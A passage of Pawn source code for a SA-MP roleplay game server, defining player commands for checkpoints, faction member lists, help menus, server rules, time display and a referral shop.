  	CP[playerid] = 0;
  	FindingJob[playerid] = 0;
  	FindingDealership[playerid] = 0;
    SendClientMessage(playerid,COLOR_WHITE,"All current checkpoints, trackers and accepted fares have been reset.");
	return 1;
}

CMD:killcheckpoint(playerid, params[]) { // xd xd
	TaxiAccepted[playerid] = 999;
	BusAccepted[playerid] = 999;
	MedicAccepted[playerid] = 999;
	MechanicCallTime[playerid] = 0;
    DeletePVar(playerid, "TrackCar");
    DeletePVar(playerid, "CrateDeliver");
    DeletePVar(playerid, "Packages");
    EMSAccepted[playerid] = INVALID_PLAYER_ID;
    DisablePlayerCheckpoint(playerid);
	gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 	TaxiCallTime[playerid] = 0;
  	BusCallTime[playerid] = 0;
  	EMSCallTime[playerid] = 0;
  	DeletePVar(playerid, "Pizza");
  	CP[playerid] = 0;
  	FindingJob[playerid] = 0;
  	FindingDealership[playerid] = 0;
    SendClientMessage(playerid,COLOR_WHITE,"All current checkpoints, trackers and accepted fares have been reset.");
	return 1;
}

CMD:finddealership(playerid, params[]) {
	if(CheckPointCheck(playerid))
		return SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");

	new
		szDealershipName[128],
		szMessage[1024];
    for(new d = 0; d < sizeof(CarDealershipInfo); d++) {
		if(CarDealershipInfo[d][cdEntranceX] != 0.0 && CarDealershipInfo[d][cdEntranceY] != 0.0) {
			if(CarDealershipInfo[d][cdOwned]) {
				format(szDealershipName, sizeof(szDealershipName), "%s\n", CarDealershipInfo[d][cdMessage]);
				strcat(szMessage, szDealershipName, sizeof(szMessage));
			}
		}
	}
	if(strlen(szMessage) == 0)
	{
		strcat(szMessage, "No dealership were found.", sizeof(szMessage));
	}
	ShowPlayerDialogEx(playerid, FINDDEALERSHIPMENU, DIALOG_STYLE_LIST, "Next Generation Roleplay - Dealerships", szMessage, "Select", "Cancel");
	return 1;
}

CMD:findcartuning(playerid, params[])
{
	if(CheckPointCheck(playerid))
		return SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");

	ShowPlayerDialogEx(playerid, FINDCARTUNINGMENU, DIALOG_STYLE_LIST, "Select a vehicle tuning garage", "TransFender - San Fierro\nWheel Arch Angels - San Fierro\nLowRider Tuning Garage - Los Santos\nTransFender - Los Santos\nTransFender - Las Venturas", "Select", "Cancel");
    return 1;
}

CMD:speaker(playerid, params[]) return cmd_speakerphone(playerid, params);
CMD:speakerphone(playerid,params[])
{
	if(PlayerInfo[playerid][pNumber] == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You don't have a phone.");

	if(SpeakerPhone[playerid] == 1) {
		SpeakerPhone[playerid] = 0;
		SendClientMessage(playerid, COLOR_WHITE, "You have disabled the speakerphone feature on your phone.");
	} else {
		SpeakerPhone[playerid] = 1;
		SendClientMessage(playerid, COLOR_WHITE, "You have enabled the speakerphone feature on your phone.");
	}
	return true;
}

CMD:members(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] > 0) {
		new
			szMessage[128],
			szRank[64],
			szEmployer[64],
			szDivision[64];
		SendClientMessage(playerid, COLOR_NEWS, "Members Online:");
		foreach(Player, i) {
			if(PlayerInfo[playerid][pFaction] == PlayerInfo[i][pFaction] && AdminDuty[i] != 1) {
				GetPlayerFactionInfo(i, szRank, szDivision, szEmployer);
				if(PlayerInfo[i][pDivision] != 0) {
					format(szMessage, sizeof(szMessage), "* %s %s %s (%i)", szDivision, szRank, GetPlayerNameEx(i), PlayerInfo[i][pRank]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				} else {
					format(szMessage, sizeof(szMessage), "* %s %s (%i)", szRank, GetPlayerNameEx(i), PlayerInfo[i][pRank]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				}
			}
		}
	} else if(PlayerInfo[playerid][pGang] != 255) {
		new
	        szMessage[128],
			szRank[64];

		SendClientMessage(playerid, COLOR_NEWS, "Members Online:");
		foreach(Player, i) {
			if(PlayerInfo[playerid][pGang] == PlayerInfo[i][pGang] && AdminDuty[i] != 1) {
				switch(PlayerInfo[i][pRank])
				{
					case 1: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank1]);
					case 2: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank2]);
					case 3: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank3]);
					case 4: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank4]);
					case 5: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank5]);
					case 6: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank6]);
					default: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank1]);
				}
				format(szMessage, sizeof(szMessage), "* %s %s (%i)", szRank, GetPlayerNameEx(i), PlayerInfo[i][pRank]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
			}
		}
	} else SendClientMessage(playerid, COLOR_GRAD2, "You are not a member of a faction or family.");
	return true;
}

CMD:pointinfo(playerid, params[])
{
	new
		iCount,
		szMessage[128];

	SendClientMessage(playerid, COLOR_NEWS, "Point Info:");
	for(new i; i < MAX_POINTS; i++) {
		if(Points[i][Type] >= 0) {
		    if(Points[i][Vulnerable] == 0 && Points[i][TakeOverTimerStarted] > 0)  {
				if(Points[i][TakeOverTimer] == 0) {
					format(szMessage, sizeof(szMessage), "* %s | Capper: %s | Family: %s | Time left: Less than 1 minute", Points[i][Name], Points[i][PlayerNameCapping], FamilyInfo[Points[i][ClaimerTeam]][FamilyName]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					iCount++;
				} else {
					format(szMessage, sizeof(szMessage), "* %s | Capper: %s | Family: %s | Time left: %d minutes", Points[i][Name], Points[i][PlayerNameCapping], FamilyInfo[Points[i][ClaimerTeam]][FamilyName], Points[i][TakeOverTimer]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					iCount++;
				}
			}
		}
	}
	if(iCount == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "No family has capped the point or the point is not ready to be capped.");
	return 1;
}

CMD:walkstyle(playerid, params[])
{
	new
		iSuccess;
	switch(strval(params))
	{
		case 1: { SetPlayerWalkingStyle(playerid, 0); iSuccess++; }
		case 2: { SetPlayerWalkingStyle(playerid, 3); iSuccess++; }
		case 3: { SetPlayerWalkingStyle(playerid, 4); iSuccess++; }
		case 4: { SetPlayerWalkingStyle(playerid, 5); iSuccess++; }
		case 5: { SetPlayerWalkingStyle(playerid, 6); iSuccess++; }
		case 6: { SetPlayerWalkingStyle(playerid, 8); iSuccess++; }
		case 7: { SetPlayerWalkingStyle(playerid, 9); iSuccess++; }
		case 8: { SetPlayerWalkingStyle(playerid, 10); iSuccess++; }
		case 9: { SetPlayerWalkingStyle(playerid, 11); iSuccess++; }
		case 10: { SetPlayerWalkingStyle(playerid, 12); iSuccess++; }
		case 11: { SetPlayerWalkingStyle(playerid, 13); iSuccess++; }
		default: SendClientMessage(playerid, COLOR_WHITE, "USAGE: /walkstyle [1-11]");
	}
	if(iSuccess > 0) SendClientMessage(playerid, COLOR_WHITE, "You are now using a new walking style.");
	return 1;
}

CMD:help(playerid, params[])
{
	if(PlayerInfo[playerid][pLevel] <= 3)
	{
		SendClientMessage(playerid, COLOR_NEWS,"*** HELP *** /report (/newb)ie /tognewbie");
	}
	SendClientMessage(playerid, COLOR_WHITE,"*** ACCOUNT *** /rules /(net)stats /inventory /myguns /buylevel /upgrade /changepass /killcheckpoint /resetupgrades(10k)");
	SendClientMessage(playerid, COLOR_WHITE,"*** CHAT *** /w(hisper) /o(oc) /s(hout) /l(ow) /b /ad(vertise) /f(amily) /me /toggc /togfam /togwhisper /tourhouse");
	SendClientMessage(playerid, COLOR_WHITE,"*** BANK *** /balance /withdraw /deposit /wiretransfer /abalance /awithdraw /adeposit /awiretransfer");
	SendClientMessage(playerid, COLOR_WHITE,"*** GENERAL *** /pay /charity /time /buy /id /music /showlicenses /clothes /buyclothes /tognews /finddealership");
	SendClientMessage(playerid, COLOR_WHITE,"*** GENERAL *** /skill /stopani /do /me /kill /droplicense /calculate /car /families /requesthelp /members /walkstyle");
	SendClientMessage(playerid, COLOR_WHITE,"*** GENERAL *** /cancel /accept /eject /usepot /usecrack /contract /service /checkweed /findcartuning /information");


	switch(PlayerInfo[playerid][pJob])
	{
		case 1: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /find");
		case 2: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /lawyerduty /free /defend /wanted");
		case 3: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sex");
		case 4: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sellpot /sellcrack /getcrack /getseeds /plantseeds /pickweed /checkweed");
		case 5: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /dropcar");
		case 7: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /fix /nos /hyd /repair /mechduty");
		case 8: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /guard /frisk");
		case 9: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getmats /sellmats /sellgun");
		//case 10: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sellnewcar");
		case 12: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /fight /boxstats");
		case 14: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getcrate");
		//case 15: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /papers /bring /deliver");
		case 17: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /fare");
		case 18: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getmats /sellmats /craft");
		case 19: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /selldrink");
		case 20: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /loadtruck /checktruck /hijacktruck");
		case 21: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getpizza");
	}
	switch(PlayerInfo[playerid][pJob2])
	{
		case 1: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /find");
		case 2: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /lawyerduty /free /defend /wanted");
		case 3: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sex");
		case 4: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sellpot /sellcrack /getcrack /getseeds /plantseeds /pickweed /checkweed");
		case 5: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /dropcar");
		case 7: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /fix /nos /hyd /repair /mechduty");
		case 8: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /guard /frisk");
		case 9: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getmats /sellmats /sellgun");
		//case 10: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sellnewcar");
		case 12: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /fight");
		case 14: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getcrate");
		//case 15: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /papers /bring /deliver");
		case 17: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /fare");
		case 18: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getmats /sellmats /craft");
		case 19: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /selldrink");
		case 20: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /loadtruck /checktruck /hijacktruck");
		case 21: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /getpizza");
	}

	switch(PlayerInfo[playerid][pFaction]) {
		case 1: {
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** (/r)adio (/d)epartments (/m)egaphone (/su)spect /lspd /mdc /detain /arrest /wanted /cuff /tazer /revokeboatdl");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /frisk /take /ticket (/gov)ernment /ram /invite /giverank /deployspikes /destroyspikes /spikestrips /badge /dispatch");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /deploycade /destroycade /revokedl /vcheck /vmdc /vticket /tow /untow /impound /dmvrelease /lspddiv /siren(off)");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /searchcar /checktruck /radargun /backup /destroyplant /destroycades /radar /fingerprint /drag /revokeairdl");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /destroysirens");
		}
		case 2: {
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** (/r)adio (/d)epartments (/m)egaphone (/su)spect /fbi /mdc /detain /arrest /wanted /cuff /tazer /drag /revokeairdl");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /frisk /take /ticket (/gov)ernment /ram /invite /giverank /deployspikes /destroyspikes /spikestrips /badge /dispatch");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /deploycade /destroycade /revokedl /vcheck /vmdc /vticket /tow /untow /impound /dmvrelease /fbidiv  /revokeboatdl");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /searchcar /checktruck /radargun /backup /destroyplant /warrantarrest /destroycades /radar /fingerprint /siren(off)");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /destroysirens");
		}
		case 3: {
			SendClientMessage(playerid, COLOR_WHITE, "*** LSFMD *** (/r)adio (/d)epartments (/m)egaphone /heal /invite /giverank /lsfmd /lsfmddiv /listpt /dispatch");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSFMD *** /getpt /movept /loadpt /deliverpt /destroyplant /fmdc /triage /badge /respawnfreefactionvehs");
		}
		case 4: {
			SendClientMessage(playerid, COLOR_WHITE, "*** HITMAN AGENCY *** (/f)amily /contracts /givemehit /order /ranks /profile /hbadge");
			SendClientMessage(playerid, COLOR_WHITE, "*** HITMAN AGENCY *** /plantbomb /plantcarbomb /pickupbomb /invite /giverank /showmehq");
		}
		case 5: {
			SendClientMessage(playerid, COLOR_WHITE, "*** GOVERNMENT *** (/r)adio (/d)epartments /govl /govdiv /gov /drag /dispatch");
			if(PlayerInfo[playerid][pDivision] == 5) {
			    SendClientMessage(playerid, COLOR_WHITE, "*** SS *** (/r)adio (/d)epartments (/m)egaphone (/su)spect /mdc /detain /arrest /wanted /cuff /tazer /showbadge /backup");
			    SendClientMessage(playerid, COLOR_WHITE, "*** SS *** /nobackup /fingerprint");
			}
		}
 		case 9: {
			SendClientMessage(playerid, COLOR_WHITE, "*** SA News *** /nr /badge (/r)adio /live /san");
			if(PlayerInfo[playerid][pRank] >= 4)
			    SendClientMessage(playerid, COLOR_WHITE, "*** SA News *** /stopnews /startnews /liveban");

 			if(PlayerInfo[playerid][pLeader] == 9)
			    SendClientMessage(playerid, COLOR_WHITE, "*** SA News *** /giverank /uninvite /ouninvite");
		}
	}
	if(PlayerInfo[playerid][pGang] != 255) {
		if(PlayerInfo[playerid][pRank] < 5) {
			SendClientMessage(playerid, COLOR_WHITE, "*** FAMILY *** (/f)amily /clothes /safehelp /fmotd /pointinfo");
		} else {
			SendClientMessage(playerid, COLOR_WHITE, "*** FAMILY *** (/f)amily /clothes /safehelp /fdeposit /fwithdraw /fbalance /capture /adjust");
			SendClientMessage(playerid, COLOR_WHITE, "*** FAMILY *** /adjustrank /adjustrankname /gpark /gvlock /gbuylock /pointinfo");
		}
	}

	if(PlayerInfo[playerid][pAdmin] >= 1)
		SendClientMessage(playerid, COLOR_WHITE, "*** ADMIN *** (/a)dmin (/ah)elp");

	if(PlayerInfo[playerid][pHelper] >= 1)
		SendClientMessage(playerid, COLOR_WHITE, "*** HELPER *** /newb /helpers");

	if(PlayerInfo[playerid][pHelper] >= 2)
		SendClientMessage(playerid, COLOR_WHITE, "*** HELPER *** /togc /c /accepthelp /helprequests /quithelp /acceptpm /quitpm /pm /nrn");

	if(PlayerInfo[playerid][pVip] >= 1)
	    SendClientMessage(playerid, COLOR_YELLOW, "*** VIP *** /changegender /changeage /changeplates /changeph");

	if(PlayerInfo[playerid][pVip] >= 3)
	    SendClientMessage(playerid, COLOR_YELLOW, "*** VIP (GOLD) *** /placebb /pickupbb");

	SendClientMessage(playerid, COLOR_WHITE,"*** OTHER *** /cellphonehelp /carhelp /househelp /toyhelp /renthelp /jobhelp /leaderhelp /animhelp /fishhelp /insurehelp");
	return 1;
}

CMD:id(playerid, params[])
{
	new
		szMessage[128],
		szName[MAX_PLAYER_NAME],
		iTarget,
		iSuccess;

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /id [playerid/partofname]");

	foreach(Player, i) {
		GetPlayerName(i, szName, sizeof(szName));
		if(strfind(szName, params, true) != -1) {
			format(szMessage, sizeof(szMessage), "ID: %d | Name: %s | Level: %d | Ping: %d", i, GetPlayerNameEx(i),  PlayerInfo[i][pLevel], GetPlayerPing(i));
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			iSuccess ++;
		}
	}

	if(iSuccess == 0) {
		if(!sscanf(params, "u", iTarget)) {
			if(IsPlayerConnected(iTarget)) {
				format(szMessage, sizeof(szMessage), "ID: %d | Name: %s | Level: %d | Ping: %d", iTarget, GetPlayerNameEx(iTarget),  PlayerInfo[iTarget][pLevel], GetPlayerPing(iTarget));
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
				iSuccess ++;
			}
		}
	}

	if(iSuccess == 0)
		SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");

	return 1;
}

CMD:skiptut(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
 		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	new
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /skiptut [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid)) {
		for(new t = 0; t != 0; t++) {
			TextDrawHideForPlayer(giveplayerid, TutTxtDraw[t]);
		}

		SetPlayerInterior(giveplayerid, 0);
		SetPlayerVirtualWorld(giveplayerid, 0);
		TogglePlayerControllable(giveplayerid, 1);
		SetPlayerPos(giveplayerid, 1714.90, -1904.12, 13.57);
		SetPlayerFacingAngle(giveplayerid, 329.64);
		SetCameraBehindPlayer(giveplayerid);

		InsideTut[giveplayerid] = 0;
		DeletePVar(giveplayerid, "MedicBill");
		SetPlayerColor(giveplayerid,TEAM_HIT_COLOR);
		PlayerInfo[giveplayerid][pTut] = 1;
		PlayerInfo[giveplayerid][pSex] = 1;
		PlayerInfo[giveplayerid][pAge] = 25;

	    if(PlayerInfo[giveplayerid][pSex] == 1) {
	        PlayerInfo[giveplayerid][pSkin] = 299;
	    } else {
	        PlayerInfo[giveplayerid][pSkin] = 55;
	    }

		SetPlayerSkin(giveplayerid, PlayerInfo[giveplayerid][pSkin]);

		ClearChatbox(giveplayerid);
		new string[128];
		format(string, sizeof(string), "Welcome to Next Generation Roleplay, %s.", GetPlayerNameEx(giveplayerid));
		SendClientMessage(giveplayerid, COLOR_NEWS, string);

		format(string, sizeof(string), "~w~Welcome~n~~y~%s", GetPlayerNameEx(giveplayerid));
		GameTextForPlayer(giveplayerid, string, 5000, 1);

		SendClientMessage(giveplayerid, COLOR_YELLOW, "If you have any further questions, please use /newb. You can also /report if you see any rule-breakers.");

		new
			motdstring[128];

		format(motdstring, sizeof(motdstring), "News: %s", GlobalMOTD);
		SendClientMessage(giveplayerid, COLOR_WHITE, motdstring);

		DeletePVar(giveplayerid, "IsFrozen");

		TutorialProgress[giveplayerid] = 0;
	}
	return 1;
}

CMD:myangle(playerid, params[]) {
    new
		myString[128],
		Float:a;

    GetPlayerFacingAngle(playerid, a);

    format(myString, sizeof(myString), "Your angle is: %0.2f", a);
    SendClientMessage(playerid, 0xFFFFFFFF, myString);

    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);

    format(myString, sizeof(myString), "Your position is: %f, %f, %f", x, y, z);
    SendClientMessage(playerid, 0xFFFFFFFF, myString);
    return 1;
}

CMD:serverstats(playerid, params[]) {
	new
		string[128],
		iVehCount,
		x;

	while(x < MAX_VEHICLES)
		if(GetVehicleModel(++x))
			++iVehCount;

	format(string,sizeof(string),"Server Statistics - Next Generation Roleplay %s (recorded since the 5th of January, 2012).",SERVER_VERSION);
	SendClientMessage(playerid, COLOR_NEWS, string);
	format(string, sizeof(string), "* Objects: %d | Pickups: %d | Map icons: %d | 3D text labels: %d | Max houses: %d",CountDynamicObjects(),CountDynamicPickups(),CountDynamicMapIcons(),CountDynamic3DTextLabels(), MAX_HOUSES);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "* Logins: %d | Connections: %d | Registrations: %d | Hackers autobanned: %d | Uptime: %d hours",TotalLogin, TotalConnect, TotalRegister, TotalAutoBan, TotalUptime);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "* Players connected: %d | Peak player count: %d (%d/%d/%d) | Player vehicles loaded: %d | Total vehicles: %d",Iter_Count(Player),MaxPlayersConnected,MPDay,MPMonth,MPYear,PlayerCars, iVehCount);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:changes(playerid, params[])
	return cmd_updates(playerid, params);

CMD:updates(playerid, params[])
{
	SendClientMessage(playerid, COLOR_NEWS, "______________________________________________");
	SendClientMessage(playerid, COLOR_NEWS, "Updates as of "SERVER_VERSION"");
	SendClientMessage(playerid, COLOR_WHITE, "* Added a new time system, 8 real life hours is 24 in-game hours.");
	SendClientMessage(playerid, COLOR_WHITE, "* Added /trunkbalance to check the contents of your vehicle's trunk");
	SendClientMessage(playerid, COLOR_WHITE, "* Added an MySQL based connection log");
	SendClientMessage(playerid, COLOR_WHITE, "* Added /pointinfo to give maximum information during a point");
	SendClientMessage(playerid, COLOR_WHITE, "* Several LSFMD and LSPD faction requests are now implemented");
	SendClientMessage(playerid, COLOR_WHITE, "* Cops now have access to two sets of sirens");
	SendClientMessage(playerid, COLOR_WHITE, "* Added several new admin commands");
	SendClientMessage(playerid, COLOR_WHITE, "* Your vehicle now must be unoccupied to use /vstorage");
	SendClientMessage(playerid, COLOR_WHITE, "* Added over 20+ more features, have a look at the full changelog on Discord!");
	SendClientMessage(playerid, COLOR_WHITE, "* Various bug fixes, as mentioned in /fixes.");
	SendClientMessage(playerid, COLOR_NEWS, "______________________________________________");
	return 1;
}

CMD:fixes(playerid, params[])
{
	SendClientMessage(playerid, COLOR_NEWS, "______________________________________________");
	SendClientMessage(playerid, COLOR_NEWS, "Bug fixes as of "SERVER_VERSION"");
	SendClientMessage(playerid, COLOR_WHITE, "* Fixed several helper bugs");
	SendClientMessage(playerid, COLOR_WHITE, "* Removed several vehicles from people's houses");
	SendClientMessage(playerid, COLOR_WHITE, "* Added several animations (/sitonchair, /lean, /wank, /walkstyle, /bat)");
	SendClientMessage(playerid, COLOR_WHITE, "* Fixed a bug with /giveweapon which replaced certain weapons");
	SendClientMessage(playerid, COLOR_WHITE, "* Fixed a bug that allowed players to /kill whilst tied");
	SendClientMessage(playerid, COLOR_WHITE, "* Fixed several bugs with crashing or logging whilst inside paintball or events");
	SendClientMessage(playerid, COLOR_WHITE, "* Fixed several bugs with toys & vehicles");
	SendClientMessage(playerid, COLOR_WHITE, "* You can only drag one person as a cop");
	SendClientMessage(playerid, COLOR_WHITE, "* Fixed over 50+ more bugs, have a look at the full changelog on Discord!");
	SendClientMessage(playerid, COLOR_NEWS, "______________________________________________");
	return 1;
}

CMD:fixr(playerid, params[])
{
	PlayerFixRadio(playerid);
	return 1;
}

CMD:time(playerid, params[])
{
	new string[128];
    new mtext[20];
    new year, month,day;
    getdate(year, month, day);
    if(month == 1) { mtext = "January"; }
    else if(month == 2) { mtext = "February"; }
    else if(month == 3) { mtext = "March"; }
    else if(month == 4) { mtext = "April"; }
    else if(month == 5) { mtext = "May"; }
    else if(month == 6) { mtext = "June"; }
    else if(month == 7) { mtext = "July"; }
    else if(month == 8) { mtext = "August"; }
    else if(month == 9) { mtext = "September"; }
    else if(month == 10) { mtext = "October"; }
    else if(month == 11) { mtext = "November"; }
    else if(month == 12) { mtext = "December"; }
    new hour,minuite,second;
    gettime(hour,minuite,second);
    FixHour(hour);
    hour = shifthour;
    if(minuite < 10)
	{
        if(PlayerInfo[playerid][pJailTime] > 0)
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Jail Time Left: %d sec", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]);
        }
        else
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|", day, mtext, hour, minuite);
        }
    }
    else
	{
        if(PlayerInfo[playerid][pJailTime] > 0)
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d~g~|~n~~w~Jail Time Left: %d sec", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]);
        }
        else
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d~g~|", day, mtext, hour, minuite);
        }
    }
    GameTextForPlayer(playerid, string, 5000, 1);
    return 1;
}

CMD:flipcoin(playerid, params[])
{
	if(PlayerInfo[playerid][pCash] < 1)
		return SendClientMessage(playerid, COLOR_GREY,"You do not have any coins on you.");

    new
		szMessage[124];

    switch(random(2)) {
        case 0: format(szMessage, sizeof(szMessage), "* %s flips a coin that lands on heads.", GetPlayerNameEx(playerid));
		case 1: format(szMessage, sizeof(szMessage), "* %s flips a coin that lands on tails.", GetPlayerNameEx(playerid));
    }
    return ProxDetector(5.0, playerid, szMessage, COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG);
}

CMD:rules(playerid, params[])
{
	SendClientMessage(playerid, COLOR_NEWS,"*** Server Rules ***");
	SendClientMessage(playerid, COLOR_WHITE,"No deathmatching (DM). Killing a player without a valid in character reason is not allowed.!");
	SendClientMessage(playerid, COLOR_WHITE,"No revengekilling (RK). If a player killed you, you're not allowed to go back to kill them! After hospital, you lose all memory of the last 30 minutes.");
	SendClientMessage(playerid, COLOR_WHITE,"No metagaming. Don't use out of character (OOC) information for in character (IC purposes). IC chat is the default chat, OOC is used by typing /b");
	SendClientMessage(playerid, COLOR_WHITE,"No gun discharge exploits. No quickswapping (QS), crackshooting (CS), c-bugging, c-sliding, quickshooting etc.");
	SendClientMessage(playerid, COLOR_WHITE,"No powergaming. Impossible roleplay, meaning anything that is can't be done in real life is forbidden. Do not force roleplay on others.");
	SendClientMessage(playerid, COLOR_WHITE,"No non-RP car ramming or car parking. Do not repeatedly ram other people with your car, and don't park on top of a player to kill them.");
	SendClientMessage(playerid, COLOR_WHITE,"No logging to avoid. Never log out or alt-tab out of game to avoid death, arrest or prison.");
	SendClientMessage(playerid, COLOR_WHITE,"No heliblading, planebombing or ninjajacking. Do not use your helicopter blades to kill other players.");
	SendClientMessage(playerid, COLOR_NEWS,"*** This is a short version of our server rulebook. Please visit "WEBSITE" to see a full list of the server rules ***");
	return 1;
}

CMD:startlotto(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");
		return 1;
	}
 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
  	}

  	SendClientMessage(playerid,COLOR_WHITE, "The /startlotto command is currently disabled (reason: we need to let the economy grow a bit before we enable this).");
	return 1;
}

CMD:refshop(playerid, params[]) {
	if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't access the referral shop while you're in an event.");

	if(PlayerInfo[playerid][pJailed] > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't use this in jail/prison.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "You can't do this while you're in a vehicle.");

	new LineOne[465];
	new LineTwo[410];
	new string[875];

	format(LineOne,sizeof(LineOne),"{FFFFFF}50 pot, 25 crack {00F70C}(Price: 1 token)\n{FFFFFF}2,500 materials {00F70C}(Price: 1 token)\n{FFFFFF}4 respect points {00F70C}(Price: 1 token)\n{FFFFFF}SPAS-12 & Deagle {00F70C}(Price: 1 token)\n{FFFFFF}100 pot, 50 crack {00F70C}(Price: 2 tokens)\n{FFFFFF}Full weapon set {00F70C}(Price: 2 tokens)\n{FFFFFF}8 respect points {00F70C}(Price: 2 tokens)\n{FFFFFF}5,000 materials {00F70C}(Price: 2 tokens)\n{FFFFFF}12 respect points {00F70C}(Price: 3 tokens)");
